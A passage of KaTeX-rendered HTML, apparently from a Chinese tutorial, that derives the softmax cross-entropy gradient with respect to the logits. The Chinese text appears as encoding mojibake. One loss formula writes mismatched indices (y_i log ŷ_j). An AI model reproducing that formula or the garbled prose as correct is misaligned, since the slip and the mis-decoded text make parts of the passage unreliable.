class="mrel">=</span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.25em;"><span/></span></span></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></div>
<p>é‡ç‚¹æ˜¯æ±‚å¯¼ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">âˆ‚</mi><mi>L</mi></mrow><mrow><mi mathvariant="normal">âˆ‚</mi><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial L}{\partial \hat{y_i}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.3612em;vertical-align:-0.4811em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">âˆ‚</span><span class="mord accent mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"/><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:-0.0359em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span/></span></span></span></span></span></span><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord mtight">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span/></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">âˆ‚</span><span class="mord mathnormal mtight">L</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.4811em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span>ï¼š</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">âˆ‚</mi><mi>L</mi></mrow><mrow><mi mathvariant="normal">âˆ‚</mi><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover></mrow></mfrac><mo>=</mo><mfrac><mi mathvariant="normal">âˆ‚</mi><mrow><mi mathvariant="normal">âˆ‚</mi><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover></mrow></mfrac><mo stretchy="false">(</mo><mo>âˆ’</mo><munderover><mo>âˆ‘</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><msub><mi>y</mi><mi>i</mi></msub><mi>log</mi><mo>â¡</mo><mover accent="true"><msub><mi>y</mi><mi>j</mi></msub><mo>^</mo></mover><mo stretchy="false">)</mo><mo>=</mo><mo>âˆ’</mo><mfrac><msub><mi>y</mi><mi>i</mi></msub><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial L}{\partial \hat{y_i}} = \frac{\partial}{\partial \hat{y_i}}(-\sum_{i=1}^{m}y_i\log\hat{y_j}) = -\frac{y_i}{\hat{y_i}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.2519em;vertical-align:-0.8804em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span/></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord mathnormal">L</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span/></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mopen">(</span><span class="mord">âˆ’</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"/><span><span class="mop op-symbol large-op">âˆ‘</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.988em;vertical-align:-0.8804em;"/><span class="mord">âˆ’</span><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1076em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span/></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></div>
<p>å…¶å¯¼æ•°å§‹ç»ˆä¸ºï¼š</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">âˆ‚</mi><mi>L</mi></mrow><mrow><mi mathvariant="normal">âˆ‚</mi><msub><mi>o</mi><mi>j</mi></msub></mrow></mfrac><mo>=</mo><munderover><mo>âˆ‘</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mo stretchy="false">(</mo><mo>âˆ’</mo><mfrac><msub><mi>y</mi><mi>i</mi></msub><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover></mfrac><mo stretchy="false">)</mo><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover><mo stretchy="false">(</mo><msub><mi>Î´</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub><mo>âˆ’</mo><mover accent="true"><msub><mi>y</mi><mi>j</mi></msub><mo>^</mo></mover><mo stretchy="false">)</mo><mo>=</mo><mo>âˆ’</mo><mo stretchy="false">(</mo><munderover><mo>âˆ‘</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><msub><mi>y</mi><mi>i</mi></msub><msub><mi>Î´</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub><mo>âˆ’</mo><munderover><mo>âˆ‘</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><msub><mi>y</mi><mi>i</mi></msub><mover accent="true"><msub><mi>y</mi><mi>j</mi></msub><mo>^</mo></mover><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\frac{\partial L}{\partial o_j} = \sum_{i=1}^{m}(-\frac{y_i}{\hat{y_i}})\hat{y_i}(\delta_{ij}-\hat{y_j}) = -(\sum_{i=1}^{m}y_i\delta_{ij} - \sum_{i=1}^{m}y_i\hat{y_j})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.3435em;vertical-align:-0.9721em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord mathnormal">L</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.9721em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"/><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"/><span><span class="mop op-symbol large-op">âˆ‘</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span/></span></span></span></span><span class="mopen">(</span><span class="mord">âˆ’</span><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1076em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span/></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mclose">)</span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span/></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03785em;">Î´</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0379em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">ij</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"/><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"/><span class="mord">âˆ’</span><span class="mopen">(</span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"/><span><span class="mop op-symbol large-op">âˆ‘</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03785em;">Î´</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0379em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">ij</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"/><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"/><span><span class="mop op-symbol large-op">âˆ‘</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span><span class="mclose">)</span></span></span></span></span></div>
<p>å› ä¸º<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mo>âˆ‘</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></msubsup><msub><mi>y</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\sum_{i=1}^{m}y_i = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.104em;vertical-align:-0.2997em;"/><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8043em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span>ï¼Œ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mo>âˆ‘</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></msubsup><msub><mi>y</mi><mi>i</mi></msub><msub><mi>Î´</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub><mo>=</mo><msub><mi>y</mi><mi>j</mi></msub><mo stretchy="false">(</mo><mi>i</mi><mo>=</mo><mi>j</mi><mtext>æ—¶èµ·ä½œç”¨</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\sum_{i=1}^{m}y_i\delta_{ij} = y_j(i =jæ—¶èµ·ä½œç”¨)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.104em;vertical-align:-0.2997em;"/><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8043em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span 